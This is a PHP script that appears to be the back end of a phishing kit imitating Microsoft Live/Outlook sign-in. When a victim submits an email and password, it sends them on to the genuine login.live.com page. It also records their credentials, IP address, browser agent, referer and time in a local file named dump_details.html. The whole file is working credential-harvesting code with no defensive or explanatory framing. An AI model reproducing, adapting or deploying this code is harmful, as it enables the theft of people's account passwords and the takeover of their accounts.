<?php 

if(isset($_POST['email']) && isset($_POST['pass'])) {
	header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1511343297&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fdefault.aspx%3Frru%3Dinbox&lc=1033&id=64855&mkt=en-in&cbcxt=mai");
	
    $ipaddr = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $datetime = date('F j, Y, g:i a');
    if(isset($_SERVER['HTTP_REFERER'])) {
  	$ref = $_SERVER['HTTP_REFERER'];
	}
	else {
		$ref = "HTTP REFERER NOT SET";
	}

    $data = "<b>Email:</b> " . $_POST['email'] . "<br/>" . "<b>Password:</b> " . $_POST['pass'] . "<br/>" . "<b>IP Address:</b> " . $ipaddr . "<br/>" . "<b>Browser Agent:</b> " . $agent . "<br/>" . "<b>Referer:</b> " . $ref . "<br/>" . "<b>Date Time:</b> " . $datetime . "<br/>" . '<hr/>'  ;
    $file = fopen('dump_details.html', 'a');
    fwrite($file,$data);

}
else {
   echo '<script>window.location.href="index.php"</script>';
}
?>